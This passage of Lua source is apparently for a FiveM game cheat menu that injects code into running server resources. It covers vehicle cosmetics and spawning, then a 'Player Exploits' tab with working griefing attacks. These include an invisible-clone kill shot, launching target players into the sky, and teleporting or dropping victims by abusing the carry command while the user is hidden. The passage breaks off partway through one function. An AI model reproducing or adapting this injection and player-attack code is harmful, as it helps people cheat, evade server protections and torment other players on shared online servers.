                    elseif IsPedInAnyVehicle(ped, false) then
                        vehicle = GetVehiclePedIsIn(ped, false)
                    end

                    if vehicle ~= 0 and DoesEntityExist(vehicle) then
                        hue = (hue + 0.5) %% 360 
                        local r, g, b = HSVToRGB(hue / 360, 1.0, 1.0)
                        
                        SetVehicleCustomPrimaryColour(vehicle, r, g, b)
                        SetVehicleCustomSecondaryColour(vehicle, r, g, b)
                    else
                         Citizen.Wait(500)
                    end
                end
            end)
        ]], selectedVeh))
    end,
    function()
        rainbowPaintActive = false
        MachoInjectResource2(3, "any", [[ _G.MachoPaintLoop = false ]])
    end
)


MachoMenuText(Tab2Group1, "Change Color Cars")

MachoMenuButton(Tab2Group1, "Random Primary", function()
    local randP = math.random(0, 160)
    local selectedVeh = MachoMenuGetSelectedVehicle() or 0
    
    MachoInjectResource2(3, "any", string.format([[
        local selVeh = %d
        local ped = PlayerPedId()
        local vehicle = (selVeh ~= 0 and DoesEntityExist(selVeh)) and selVeh or GetVehiclePedIsIn(ped, false)

        if vehicle ~= 0 and DoesEntityExist(vehicle) then
            local primary, secondary = GetVehicleColours(vehicle) 
            SetVehicleModKit(vehicle, 0)
            SetVehicleColours(vehicle, %d, secondary)
        end
    ]], selectedVeh, randP))
end)

MachoMenuButton(Tab2Group1, "Random Secondary", function()
    local randS = math.random(0, 160)
    local selectedVeh = MachoMenuGetSelectedVehicle() or 0
    
    MachoInjectResource2(3, "any", string.format([[
        local selVeh = %d
        local ped = PlayerPedId()
        local vehicle = (selVeh ~= 0 and DoesEntityExist(selVeh)) and selVeh or GetVehiclePedIsIn(ped, false)

        if vehicle ~= 0 and DoesEntityExist(vehicle) then
            local primary, secondary = GetVehicleColours(vehicle) 
            SetVehicleModKit(vehicle, 0)
            SetVehicleColours(vehicle, primary, %d) 
        end
    ]], selectedVeh, randS))
end)



local function InstantPaint(colorID)
    local selectedVeh = MachoMenuGetSelectedVehicle() or 0
    MachoInjectResource2(3, "any", string.format([[
        local v = (%d ~= 0 and DoesEntityExist(%d)) and %d or GetVehiclePedIsIn(PlayerPedId(), false)
        if v ~= 0 and DoesEntityExist(v) then
            SetVehicleModKit(v, 0)
            local _, sec = GetVehicleColours(v) 
            SetVehicleColours(v, %d, sec)       
        end
    ]], selectedVeh, selectedVeh, selectedVeh, colorID))
end

local ClassicColors = {"Black", "Carbon Black", "Graphite", "Anthracite Black", "Black Steel", "Dark Steel", "Silver", "Bluish Silver", "Shadow Silver", "Stone Silver", "Midnight Silver", "Red", "Torino Red", "Formula Red", "Lava Red", "Blaze Red", "Grace Red", "Garnet Red", "Sunset Red", "Cabernet Red", "Candy Red", "Sunrise Orange", "Gold", "Orange", "Bright Orange", "Bright Yellow", "Taxi Yellow", "Race Yellow", "Bronze", "Yellow Bird", "Lime Green", "Green", "Sea Green", "Olive Green", "Bright Green", "Gasoline Green", "Dark Blue", "Midnight Blue", "Saxon Blue", "Blue", "Mariner Blue", "Harbor Blue", "Diamond Blue", "Surf Blue", "Nautical Blue", "Ultra Blue", "Racing Blue", "Sky Blue", "Baby Blue", "Cream", "White", "Frost White"}

MachoMenuDropDown(Tab2Group1, "Classic/Metallic", function(Index)
    local IDs = {0, 147, 1, 11, 2, 3, 4, 5, 7, 8, 9, 27, 28, 29, 150, 30, 31, 32, 33, 34, 35, 36, 37, 38, 138, 88, 89, 90, 91, 92, 92, 94, 95, 96, 97, 98, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 73, 74, 87, 107, 111, 112}
    InstantPaint(IDs[Index + 1] or 0)
end, table.unpack(ClassicColors))

local MatteColors = {"Black", "Gray", "Light Gray", "Ice White", "Blue", "Dark Blue", "Midnight Blue", "Midnight Purple", "Purple", "Red", "Dark Red", "Orange", "Yellow", "Lime Green", "Green", "Forest Green", "Foliage Green", "Olive Drab", "Desert Tan", "Brown"}

MachoMenuDropDown(Tab2Group1, "Standard Matte", function(Index)
    local IDs = {12, 13, 14, 131, 82, 83, 84, 149, 148, 39, 40, 41, 42, 128, 151, 152, 153, 154, 155, 129}
    InstantPaint(IDs[Index + 1] or 12)
end, table.unpack(MatteColors))

local MetalColors = {"Brushed Steel", "Brushed Black Steel", "Brushed Aluminium", "Pure Gold", "Brushed Gold", "Chrome"}

MachoMenuDropDown(Tab2Group1, "Metals & Chrome", function(Index)
    local IDs = {117, 118, 119, 120, 158, 120}
    InstantPaint(IDs[Index + 1] or 117)
end, table.unpack(MetalColors))

MachoMenuText(Tab2Group1, "Change Secondary Color Cars")

local function InstantSecondaryPaint(colorID)
    local selectedVeh = MachoMenuGetSelectedVehicle() or 0
    MachoInjectResource2(3, "any", string.format([[
        local v = (%d ~= 0 and DoesEntityExist(%d)) and %d or GetVehiclePedIsIn(PlayerPedId(), false)
        if v ~= 0 and DoesEntityExist(v) then
            SetVehicleModKit(v, 0)
            local primary, _ = GetVehicleColours(v) 
            SetVehicleColours(v, primary, %d)       
        end
    ]], selectedVeh, selectedVeh, selectedVeh, colorID))
end

local SecClassicColors = {"Black", "Carbon Black", "Graphite", "Silver", "Red", "Torino Red", "Formula Red", "Blue", "Race Yellow", "Lime Green", "White", "Frost White"}

MachoMenuDropDown(Tab2Group1, "Sec. Classic/Metallic", function(Index)
    local IDs = {0, 147, 1, 4, 27, 28, 29, 64, 90, 92, 111, 112}
    InstantSecondaryPaint(IDs[Index + 1] or 0)
end, table.unpack(SecClassicColors))

local SecMatteColors = {"Matte Black", "Matte Gray", "Matte Red", "Matte Blue", "Matte Yellow", "Matte Green", "Matte White"}

MachoMenuDropDown(Tab2Group1, "Sec. Matte", function(Index)
    local IDs = {12, 13, 39, 82, 42, 151, 131}
    InstantSecondaryPaint(IDs[Index + 1] or 12)
end, table.unpack(SecMatteColors))


local SecMetalColors = {"Brushed Steel", "Brushed Aluminium", "Pure Gold", "Brushed Gold", "Chrome"}

MachoMenuDropDown(Tab2Group1, "Metals/Chrome", function(Index)
    local IDs = {117, 119, 120, 158, 120}
    InstantSecondaryPaint(IDs[Index + 1] or 117)
end, table.unpack(SecMetalColors))







MachoMenuButton(Tab2Group2, "Repair Vehicle", function()
    local selectedVeh = MachoMenuGetSelectedVehicle() or 0
    
    MachoInjectResource2(3, "any", string.format([[
        local selVeh = %d
        local ped = PlayerPedId()
        local vehicle = (selVeh ~= 0 and DoesEntityExist(selVeh)) and selVeh or GetVehiclePedIsIn(ped, false)

        if vehicle ~= 0 and DoesEntityExist(vehicle) then
            SetVehicleFixed(vehicle)
            SetVehicleDeformationFixed(vehicle)
            SetVehicleUndriveable(vehicle, false)
            SetVehicleEngineHealth(vehicle, 1000.0)
            SetVehicleBodyHealth(vehicle, 1000.0)
            SetVehiclePetrolTankHealth(vehicle, 1000.0)
            SetVehicleDirtLevel(vehicle, 0.0)
            
            for i = 0, 7 do
                SetVehicleTyreFixed(vehicle, i)
            end
        end
    ]], selectedVeh))
end)


local VehicleInputBox = MachoMenuInputbox(Tab2Group2, "Enter Vehicle Model", "e.g., adder")
MachoMenuButton(Tab2Group2, "Spawn & Enter Vehicle", function()
    local vehicleModel = MachoMenuGetInputbox(VehicleInputBox) 
    if not vehicleModel or vehicleModel == "" then
        return 
    end
    MachoInjectResource2(3, "any", string.format([[ 
        local model = "%s"
        local hash = GetHashKey(model)
        RequestModel(hash)
        local timeout = 0
        while not HasModelLoaded(hash) and timeout < 100 do 
            Wait(10)
            timeout = timeout + 1
        end
        if HasModelLoaded(hash) then
            local ped = PlayerPedId()
            local coords = GetEntityCoords(ped)
            local oldVeh = GetVehiclePedIsIn(ped, false)
            if oldVeh ~= 0 then
                SetEntityAsMissionEntity(oldVeh, true, true)
                DeleteVehicle(oldVeh)
            end
            local vehicle = CreateVehicle(hash, coords.x, coords.y, coords.z, GetEntityHeading(ped), true, false)
            SetPedIntoVehicle(ped, vehicle, -1)
            SetModelAsNoLongerNeeded(hash)
        end
    ]], vehicleModel)) 
end)




local function FastCycle(modID)
    local v = GetVehiclePedIsIn(PlayerPedId(), false)
    if v ~= 0 then
        MachoInjectResource2(3, "any", [[
            local v = GetVehiclePedIsIn(PlayerPedId(), false)
            local id = ]] .. modID .. [[
            if v ~= 0 then
                SetVehicleModKit(v, 0)
                local cur = GetVehicleMod(v, id)
                local max = GetNumVehicleMods(v, id) - 1
                local next = cur + 1
                if next > max then next = -1 end
                SetVehicleMod(v, id, next, false)
            end
        ]])
    else
        MachoMenuNotification("ERROR", "Dapat nasa loob ka ng sasakyan!")
    end
end

MachoMenuText(Tab2Group2, "PERFORMANCE")

MachoMenuButton(Tab2Group2, "Full Upgrade Performance", function()
    local v = GetVehiclePedIsIn(PlayerPedId(), false)
    if v ~= 0 then
        MachoInjectResource2(3, "any", [[
            local v = GetVehiclePedIsIn(PlayerPedId(), false)
            if v ~= 0 then
                SetVehicleModKit(v, 0)
                
                -- Listahan ng Performance Mod IDs: 
                -- 11: Engine, 12: Brakes, 13: Transmission, 15: Suspension, 16: Armor
                local perfMods = {11, 12, 13, 15, 16}
                
                for _, modID in ipairs(perfMods) do
                    local max = GetNumVehicleMods(v, modID) - 1
                    SetVehicleMod(v, modID, max, false)
                end
                
                -- Isama na rin ang Turbo, Horn, at Tires
                ToggleVehicleMod(v, 18, true) -- Turbo ON
                SetVehicleMod(v, 14, GetNumVehicleMods(v, 14) - 1, false) -- Max Horn
                SetVehicleTyresCanBurst(v, false) -- Bulletproof Tires
            end
        ]])
        MachoMenuNotification("SUCCESS", "Vehicle is now Fully Upgraded!")
    else
        MachoMenuNotification("ERROR", "Dapat nasa loob ka ng sasakyan!")
    end
end)

MachoMenuText(Tab2Group2, "COSMETICS")

MachoMenuButton(Tab2Group2, "Spoiler", function() FastCycle(0) end)
MachoMenuButton(Tab2Group2, "Front Bumper", function() FastCycle(1) end)
MachoMenuButton(Tab2Group2, "Rear Bumper", function() FastCycle(2) end)
MachoMenuButton(Tab2Group2, "Skirts", function() FastCycle(3) end)
MachoMenuButton(Tab2Group2, "Exhaust", function() FastCycle(4) end)
MachoMenuButton(Tab2Group2, "Grille", function() FastCycle(6) end)
MachoMenuButton(Tab2Group2, "Hood", function() FastCycle(7) end)
MachoMenuButton(Tab2Group2, "Fenders", function() FastCycle(8) end)
MachoMenuButton(Tab2Group2, "Roof", function() FastCycle(10) end)


MachoMenuText(Tab2Group2, "WHEELS")

local SportWheels = {"Inferno", "Deep Five", "LozSpeed Ten", "Diamond Cut", "Chrono", "Feroci RR", "Fifty Nine", "Mercie CH", "Synthetic Z", "Organic Type", "Endo v.1", "Giga Mesh", "GT One", "Slicer", "Spindizzy"}
local MuscleWheels = {"Classic Five", "Dukes", "Muscle Freak", "Kracka", "Spooner", "Old School", "El Jefe", "Dodman", "Six Seven", "Fairlie", "Big Mamma", "Steelies", "Prima Donna", "Sovereign"}
local LowriderWheels = {"Flare", "Wired", "Gold-Tooth", "Triple-Golds", "Big Worm", "Seven-Fives", "V-Slot", "Custom Twist", "Classic Twist", "Dollar", "Big Dog", "Lowfive", "Knuckle"}
local SUVWheels = {"VIP", "Benefactor", "Cosmo", "Bippu", "Royal Tip", "Supe R", "Cotrina", "Sheriff", "Force", "Viper", "Mega-Wheel", "Granite"}
local OffroadWheels = {"Raider", "Mudslinger", "Marsh", "Dune Basher", "Freeway", "Rugged", "Sultan", "Mil Spec", "Rock Crawler", "Heavy Duty"}
local TunerWheels = {"Cosmo", "Super Mesh", "Outsider", "Rollas", "Driftmaster", "Chokador", "Konig", "Fujiwara", "Zokusha", "Battle VIII", "Rally Master"}
local HighEndWheels = {"Shadow", "Hyper", "Blade", "Diamond", "Supra", "Carbon Solar", "Cheetah RR", "Solar", "Split Six", "Dash VIP", "LozSpeed Viper"}
local BennysBespoke = {"Benedict", "Clean", "Lamar Special", "Tiger Style", "Gilded", "Knock-Offs", "Spit Five", "Solid Face", "Dished Eight", "Deep Dish", "60-Spoke", "Laced"}

local WheelColorNames = {"Black", "Carbon Black", "Graphite", "Anthracite", "Black Steel", "Dark Steel", "Silver", "Blue Silver", "Rolled Steel", "Shadow Silver", "Stone Silver", "Midnight Silver", "Cast Iron", "Red", "Torino Red", "Formula Red", "Lava Red", "Blaze Red", "Grace Red", "Garnet Red", "Sunset Orange", "Gold", "Pure Gold", "Bronze"}
local WheelColorIDs = {0, 147, 104, 105, 3, 4, 112, 127, 11, 8, 9, 10, 15, 27, 28, 29, 150, 151, 152, 153, 31, 37, 158, 154}

local function InstantWheel(wType, wIndex)
    local veh = MachoMenuGetSelectedVehicle() or 0
    MachoInjectResource2(3, "any", string.format([[
        local v = (%d ~= 0 and DoesEntityExist(%d)) and %d or GetVehiclePedIsIn(PlayerPedId(), false)
        if v ~= 0 then
            SetVehicleModKit(v, 0)
            SetVehicleWheelType(v, %d)
            SetVehicleMod(v, 23, %d, false)
            if GetVehicleClass(v) == 8 then SetVehicleMod(v, 24, %d, false) end
        end
    ]], veh, veh, veh, wType, wIndex, wIndex))
end

local function InstantColor(colorID)
    local veh = MachoMenuGetSelectedVehicle() or 0
    MachoInjectResource2(3, "any", string.format([[
        local v = (%d ~= 0 and DoesEntityExist(%d)) and %d or GetVehiclePedIsIn(PlayerPedId(), false)
        if v ~= 0 then
            local p, s = GetVehicleColours(v) 
            local pearcent, wheelc = GetVehicleExtraColours(v)
            SetVehicleExtraColours(v, pearcent, %d)
        end
    ]], veh, veh, veh, colorID))
end

MachoMenuDropDown(Tab2Group2, "Sport Wheels", function(Index) InstantWheel(0, Index) end, table.unpack(SportWheels))
MachoMenuDropDown(Tab2Group2, "Muscle Wheels", function(Index) InstantWheel(1, Index) end, table.unpack(MuscleWheels))
MachoMenuDropDown(Tab2Group2, "Lowrider Wheels", function(Index) InstantWheel(2, Index) end, table.unpack(LowriderWheels))
MachoMenuDropDown(Tab2Group2, "SUV Wheels", function(Index) InstantWheel(3, Index) end, table.unpack(SUVWheels))
MachoMenuDropDown(Tab2Group2, "Offroad Wheels", function(Index) InstantWheel(4, Index) end, table.unpack(OffroadWheels))
MachoMenuDropDown(Tab2Group2, "Tuner Wheels", function(Index) InstantWheel(5, Index) end, table.unpack(TunerWheels))
MachoMenuDropDown(Tab2Group2, "High End Wheels", function(Index) InstantWheel(7, Index) end, table.unpack(HighEndWheels))
MachoMenuDropDown(Tab2Group2, "Benny's Bespoke", function(Index) InstantWheel(9, Index) end, table.unpack(BennysBespoke))

MachoMenuDropDown(Tab2Group2, "Wheel Color", function(Index)
    InstantColor(WheelColorIDs[Index + 1])
end, table.unpack(WheelColorNames))

local TireOptions = {"Standard Tires", "Custom Tires"}
MachoMenuDropDown(Tab2Group2, "Tire Design", function(Index)
    local veh = MachoMenuGetSelectedVehicle() or 0
    local isCustom = (Index == 1) 
    MachoInjectResource2(3, "any", string.format([[
        local v = (%d ~= 0 and DoesEntityExist(%d)) and %d or GetVehiclePedIsIn(PlayerPedId(), false)
        if v ~= 0 then
            local currentMod = GetVehicleMod(v, 23)
            SetVehicleMod(v, 23, currentMod, %s)
            if GetVehicleClass(v) == 8 then SetVehicleMod(v, 24, currentMod, %s) end
        end
    ]], veh, veh, veh, tostring(isCustom), tostring(isCustom)))
end, table.unpack(TireOptions))




    Tab3Button = MachoMenuAddTab(TabbedWindow, "Player Exploits")
    Tab3Group1 = MachoMenuGroup(Tab3Button, "Troll", TabsWidth + GroupGap, GroupTopGap + WindowTopBar, TabsWidth + GroupGap + GroupSize, 500 - GroupTopGap)
    Tab3Group2 = MachoMenuGroup(Tab3Button, "Miscellaneous", TabsWidth + GroupGap + GroupSize + GroupGap, GroupTopGap + WindowTopBar, TabsWidth + GroupGap + GroupSize + GroupGap + GroupSize, 500 - GroupTopGap)
    MachoMenuGetSelectedPlayer()    
    local IsNuclearLoopActive = false
    local PlayerInputBox = MachoMenuInputbox(Tab3Group2, "Enter Player ID", "...")
    local PropInputBox = MachoMenuInputbox(Tab3Group2, "Enter Prop Model (e.g., )","prop_container_ld_pu")
    local NPCInputBox = MachoMenuInputbox(Tab3Group2, "Enter NPC Model (e.g., )", "a_m_m_skater_01")
    local NPCWeaponBox = MachoMenuInputbox(Tab3Group2, "Enter NPC Weapon (e.g., )", "WEAPON_KNIFE")


    
MachoMenuCheckbox(Tab3Group1, "One Punch", function()
    MachoMenuNotification("1 Punch", "ENABLED | Left Click")
    
    MachoInjectResource('monitor', [[
        _G.MachoOnePunchActive = true
        local isProcessing = false 

        local function GetMeleeTarget()
            local me = PlayerPedId()
            local found, target = GetPlayerTargetEntity(PlayerId())
            
            if not found or not IsEntityAPed(target) then
                local myCoords = GetEntityCoords(me)
                for _, player in ipairs(GetActivePlayers()) do
                    local pPed = GetPlayerPed(player)
                    if pPed ~= me and DoesEntityExist(pPed) then
                        local pCoords = GetEntityCoords(pPed)
                        if #(myCoords - pCoords) <= 2.5 then
                            return pPed
                        end
                    end
                end
                return 0
            end
            return target
        end

        Citizen.CreateThread(function()
            while _G.MachoOnePunchActive do
                local me = PlayerPedId()
                
                if IsControlJustPressed(0, 24) and GetSelectedPedWeapon(me) == GetHashKey("WEAPON_UNARMED") and not isProcessing then
                    local targetPed = GetMeleeTarget()

                    if targetPed ~= 0 and not IsPedDeadOrDying(targetPed) then
                        isProcessing = true 

                        Citizen.Wait(600) 

                        local twin = ClonePed(targetPed, GetEntityHeading(targetPed), false, false)
                        
                        if DoesEntityExist(twin) then
                            local headCoords = GetPedBoneCoords(targetPed, 31086, 0.0, 0.0, 0.0)
                            
                            SetEntityVisible(twin, false, false)
                            SetEntityAlpha(twin, 0, false)
                            SetEntityCollision(twin, false, false)
                            FreezeEntityPosition(twin, true)

                            SetEntityCoords(twin, headCoords.x, headCoords.y, headCoords.z + 0.5, false, false, false, true)

                            local wH = 0xBFD21232 
                            GiveWeaponToPed(twin, wH, 1, false, true)
                            SetCurrentPedWeapon(twin, wH, true)

                            ShootSingleBulletBetweenCoords(
                                headCoords.x, headCoords.y, headCoords.z + 0.4, 
                                headCoords.x, headCoords.y, headCoords.z, 
                                250, true, wH, me, true, false, 1000.0
                            )

                            Citizen.SetTimeout(50, function()
                                if DoesEntityExist(twin) then DeleteEntity(twin) end
                            end)
                        end
                        
                        Citizen.Wait(400) 
                        isProcessing = false 
                    end
                end
                Wait(0)
            end
        end)
    ]])
end, function()
    MachoMenuNotification("1 Punch", "DISABLED")
    MachoInjectResource('monitor', [[ _G.MachoOnePunchActive = false ]])
end)

MachoMenuButton(Tab3Group2, "Launch Player v1", function()
    local targetId = tonumber(MachoMenuGetInputbox(PlayerInputBox))
    if not targetId or targetId == 0 or targetId == GetPlayerServerId(PlayerId()) then 
        return 
    end
    local targetModel = -699955605 
    MachoInjectResource2(3, "any", [[
        local tId = ]] .. targetId .. [[
        local model = ]] .. targetModel .. [[
        
        local targetPlayer = GetPlayerFromServerId(tId)
        local targetPed = GetPlayerPed(targetPlayer)
        
        if not DoesEntityExist(targetPed) then
            for _, player in ipairs(GetActivePlayers()) do
                if GetPlayerServerId(player) == tId then
                    targetPed = GetPlayerPed(player)
                    break
                end
            end
        end

        if DoesEntityExist(targetPed) then
            RequestModel(model)
            local waitTimer = 0
            while not HasModelLoaded(model) and waitTimer < 100 do 
                Wait(10) 
                waitTimer = waitTimer + 1
            end

            if HasModelLoaded(model) then
                local pos = GetEntityCoords(targetPed)
                local obj = CreateObject(model, pos.x, pos.y, pos.z - 1.5, true, true, true)
                
                if DoesEntityExist(obj) then
                    NetworkRequestControlOfEntity(obj)
                    NetworkRequestControlOfEntity(targetPed)
                    
                    SetEntityVisible(obj, false, true)
                    SetEntityCollision(obj, true, true)
                    SetEntityHasGravity(obj, false) 
                    
                    
                    local timer = 0
                    while timer < 70000 do 
                        if not DoesEntityExist(targetPed) or not DoesEntityExist(obj) then break end

                        SetEntityVelocity(obj, 0.0, 0.0, 10.0)

                        local oCoords = GetEntityCoords(obj)
                        SetEntityCoordsNoOffset(targetPed, oCoords.x, oCoords.y, oCoords.z + 1.2, false, false, false)

                        timer = timer + 1
                        Wait(0)
                    end

                    DeleteEntity(obj)
                end
            end
        end
    ]])
end)


MachoMenuButton(Tab3Group2, "Instant Sky Launch", function()
    local rawId = MachoMenuGetInputbox(PlayerInputBox)
    local targetServerId = tonumber(rawId)
    if not targetServerId then return end

    local resName = "monitor" 
    local threadName = "" 

    local scriptToInject = string.format([[
        local targetId = %d
        local myPed = PlayerPedId()
        local oldCoords = GetEntityCoords(myPed)
        
        local targetIdx = GetPlayerFromServerId(targetId)
        if targetIdx ~= -1 then
            local targetPed = GetPlayerPed(targetIdx)
            
            if DoesEntityExist(targetPed) then
                SetEntityVisible(myPed, false, false)
                SetEntityAlpha(myPed, 0, false)
                
                local targetPos = GetEntityCoords(targetPed)
                SetEntityCoordsNoOffset(myPed, targetPos.x, targetPos.y, targetPos.z, false, false, false)
                Wait(150) 

                ExecuteCommand("carry")
                
                local attached = false
                for i = 1, 15 do
                    if IsEntityAttachedToEntity(targetPed, myPed) then
                        attached = true
                        break
                    end
                    Wait(50) 
                end

                if attached then
                    local currentZ = targetPos.z
                    for i = 1, 60 do 
                        currentZ = currentZ + 40.0 
                        SetEntityCoordsNoOffset(myPed, targetPos.x, targetPos.y, currentZ, true, false, false)
                        Wait(10) 
                    end
                    
                    FreezeEntityPosition(myPed, true)
                    Wait(50) 

                    NetworkRequestControlOfEntity(targetPed)
                    
                    for i = 1, 5 do
                        ExecuteCommand("carry") 
                        DetachEntity(targetPed, true, true)
                        ClearPedTasksImmediately(targetPed)
                        SetPedToRagdoll(targetPed, 10000, 10000, 0, 0, 0, 0)
                        Wait(10)
                    end
                end

                FreezeEntityPosition(myPed, false)
                SetEntityCoords(myPed, oldCoords.x, oldCoords.y, oldCoords.z, false, false, false, false)
                SetEntityVisible(myPed, true, false)
                ResetEntityAlpha(myPed)
            end
        end 
    ]], targetServerId)

    MachoInjectThread(0, resName, threadName, scriptToInject)
end)





MachoMenuButton(Tab3Group2, "Bring Player", function()
    local rawId = MachoMenuGetInputbox(PlayerInputBox)
    local targetServerId = tonumber(rawId)
    if not targetServerId then return end
    local targetResources = {"monitor"} 
    for _, resName in ipairs(targetResources) do
        if MachoResourceInjectable(resName) then
            MachoInjectThread(0, resName, "", [[
    local targetId = ]] .. targetServerId .. [[
    local myPed = PlayerPedId()
    local myPos = GetEntityCoords(myPed) 
    
    local targetPed = 0
    for _, player in ipairs(GetActivePlayers()) do
        if GetPlayerServerId(player) == targetId then
            targetPed = GetPlayerPed(player)
            break
        end
    end

    if targetPed ~= 0 and DoesEntityExist(targetPed) then
        
        SetEntityVisible(myPed, false, false)
        SetEntityAlpha(myPed, 0, false)
        
        SetEntityCoords(myPed, GetEntityCoords(targetPed), false, false, false, false)
        Citizen.Wait(200)

        ExecuteCommand("carry")
        Citizen.Wait(100)
        
        if not IsEntityAttachedToEntity(targetPed, myPed) then
            ExecuteCommand("piggyback")
            Citizen.Wait(100)
        end
        
       

        if IsEntityAttachedToEntity(targetPed, myPed) then
            SetEntityCoords(myPed, myPos.x, myPos.y, myPos.z, false, false, false, false)
            Citizen.Wait(300)

            ExecuteCommand("carry")
            ExecuteCommand("piggyback")

            NetworkRequestControlOfEntity(targetPed)
            DetachEntity(targetPed, true, true)
            ClearPedTasksImmediately(targetPed)
            SetPedToRagdoll(targetPed, 5000, 5000, 0, 0, 0, 0)
        end
        
        SetEntityVisible(myPed, true, false)
        ResetEntityAlpha(myPed)
    end
]])
        end
    end
end)

MachoMenuButton(Tab3Group2, "Grave Player", function()
    local rawId = MachoMenuGetInputbox(PlayerInputBox)
    local targetServerId = tonumber(rawId)
    if not targetServerId then return end
    
    local targetResources = {"monitor"} 
    for _, resName in ipairs(targetResources) do
        if MachoResourceInjectable(resName) then
 
            MachoInjectThread(0, resName, "", [[
                local targetId = ]] .. targetServerId .. [[
                local myPed = PlayerPedId()
                local oldCoords = GetEntityCoords(myPed)
                
                local targetPed = 0
                for _, player in ipairs(GetActivePlayers()) do
                    if GetPlayerServerId(player) == targetId then
                        targetPed = GetPlayerPed(player)
                        break
                    end
                end

                if targetPed ~= 0 and DoesEntityExist(targetPed) then
                    SetEntityVisible(myPed, false, false)
                    SetEntityAlpha(myPed, 0, false)
                    SetEntityCoords(myPed, GetEntityCoords(targetPed), false, false, false, false)
                    Citizen.Wait(200)

                    ExecuteCommand("carry")
                    Citizen.Wait(300)

                    local currentPos = GetEntityCoords(myPed)
                    SetEntityCoords(myPed, currentPos.x, currentPos.y, currentPos.z - 5.0, false, false, false, false)
                    FreezeEntityPosition(myPed, true) 
                    Citizen.Wait(800)

                    ExecuteCommand("carry") 
                    NetworkRequestControlOfEntity(targetPed)
                    DetachEntity(targetPed, true, true)
                    ClearPedTasksImmediately(targetPed)
                    ClearPedTasksImmediately(myPed)
                    
                    SetPedToRagdoll(targetPed, 5000, 5000, 0, 0, 0, 0)
                    
                    Citizen.Wait(100)

                    FreezeEntityPosition(myPed, false)
                    SetEntityCoords(myPed, oldCoords.x, oldCoords.y, oldCoords.z, false, false, false, false)
                    
                    SetEntityVisible(myPed, true, false)
                    ResetEntityAlpha(myPed)
                end
            ]])
        end
    end
end)


MachoMenuButton(Tab3Group2, "Maze Drop", function()
    local rawId = MachoMenuGetInputbox(PlayerInputBox)
    local targetServerId = tonumber(rawId)
    if not targetServerId then return end

    local resName = "monitor" 
    local scriptToInject = string.format([[
        local targetId = %d
        local myPed = PlayerPedId()
        local oldCoords = GetEntityCoords(myPed)
        
        -- DITO MO ILAGAY KUNG SAAN MO GUSTO ITAPON (Chiliad, Maze, etc.)
        local destination = vector3(-97.07, -822.6, 295.88) 
        
        local targetIdx = GetPlayerFromServerId(targetId)
        if targetIdx ~= -1 then
            local targetPed = GetPlayerPed(targetIdx)
            if DoesEntityExist(targetPed) then
                -- 1. SYNC & ATTACH
                SetEntityVisible(myPed, false, false)
                local startPos = GetEntityCoords(targetPed)
                SetEntityCoordsNoOffset(myPed, startPos.x, startPos.y, startPos.z, false, false, false)
                Wait(300)

                ExecuteCommand("carry")
                local attached = false
                for i = 1, 15 do
                    if IsEntityAttachedToEntity(targetPed, myPed) then
                        attached = true
                        break
                    end
                    Wait(60) 
                end

                -- 2. UNIVERSAL JUMP LOGIC (300m Segmented Travel)
                if attached then
                    local currentPos = startPos
                    local totalDist = #(currentPos - destination)
                    local maxJump = 250.0 -- Safe range para laging loaded ang target
                    local steps = math.ceil(totalDist / maxJump)
                    
                    for i = 1, steps do
                        -- Double Check: Pag nabitawan, teleport agad sa target para subukan i-re-attach
                        if not IsEntityAttachedToEntity(targetPed, myPed) then 
                            local rescuePos = GetEntityCoords(targetPed)
                            SetEntityCoordsNoOffset(myPed, rescuePos.x, rescuePos.y, rescuePos.z, false, false, false)
                            Wait(100)
                            ExecuteCommand("carry")
                            Wait(100)
                        end
                        
                        -- Calculate next "Jump" point
                        local nextHop = startPos + (destination - startPos) * (i / steps)
                        
                        -- Pilitin ang world streaming ('true' parameter)
                        SetEntityCoordsNoOffset(myPed, nextHop.x, nextHop.y, nextHop.z, true, false, false)
                        
                        -- Importante ang Wait dito para makahabol ang server sync/assets
                        Wait(350) 
                    end
                    
                    Wait(200)
                    SetEntityCoordsNoOffset(myPed, destination.x, destination.y, destination.z, false, false, false)
                    FreezeEntityPosition(myPed, true)

                    NetworkRequestControlOfEntity(targetPed)
                    for i = 1, 10 do
                        ExecuteCommand("carry") 
                        DetachEntity(targetPed, true, true)
                        ClearPedTasksImmediately(targetPed)
                        SetPedToRagdoll(targetPed, 10000, 10000, 0, 0, 0, 0)
                        Wait(10)
                    end
                end
                
                -- 4. RETURN
                FreezeEntityPosition(myPed, false)
                SetEntityCoords(myPed, oldCoords.x, oldCoords.y, oldCoords.z, false, false, false, false)
                SetEntityVisible(myPed, true, false)
            end
        end
    ]], targetServerId)

    MachoInjectThread(0, resName, "", scriptToInject)
end)

MachoMenuButton(Tab3Group2, "Cementery Drop", function()
    local rawId = MachoMenuGetInputbox(PlayerInputBox)
    local targetServerId = tonumber(rawId)
    if not targetServerId then return end

    local resName = "monitor" 
    local scriptToInject = string.format([[
        local targetId = %d
        local myPed = PlayerPedId()
        local oldCoords = GetEntityCoords(myPed)
        
        -- DITO MO ILAGAY KUNG SAAN MO GUSTO ITAPON (Chiliad, Maze, etc.)
        local destination = vector3(-1762.92, -262.48, 48.24) 
        
        local targetIdx = GetPlayerFromServerId(targetId)
        if targetIdx ~= -1 then
            local targetPed = GetPlayerPed(targetIdx)
            if DoesEntityExist(targetPed) then
                -- 1. SYNC & ATTACH
                SetEntityVisible(myPed, false, false)
                local startPos = GetEntityCoords(targetPed)
                SetEntityCoordsNoOffset(myPed, startPos.x, startPos.y, startPos.z, false, false, false)
                Wait(300)

                ExecuteCommand("carry")
                local attached = false
                for i = 1, 15 do
                    if IsEntityAttachedToEntity(targetPed, myPed) then
                        attached = true
                        break
                    end
                    Wait(60) 
                end

                -- 2. UNIVERSAL JUMP LOGIC (300m Segmented Travel)
                if attached then
                    local currentPos = startPos
                    local totalDist = #(currentPos - destination)
                    local maxJump = 250.0 -- Safe range para laging loaded ang target
                    local steps = math.ceil(totalDist / maxJump)
                    
                    for i = 1, steps do
                        if not IsEntityAttachedToEntity(targetPed, myPed) then 
                            local rescuePos = GetEntityCoords(targetPed)
                            SetEntityCoordsNoOffset(myPed, rescuePos.x, rescuePos.y, rescuePos.z, false, false, false)
                            Wait(100)
                            ExecuteCommand("carry")
                            Wait(100)
                        end
                        
                        local nextHop = startPos + (destination - startPos) * (i / steps)
                        
                        SetEntityCoordsNoOffset(myPed, nextHop.x, nextHop.y, nextHop.z, true, false, false)
                        
                        Wait(350) 
                    end
                    
                    Wait(200)
                    SetEntityCoordsNoOffset(myPed, destination.x, destination.y, destination.z, false, false, false)
                    FreezeEntityPosition(myPed, true)

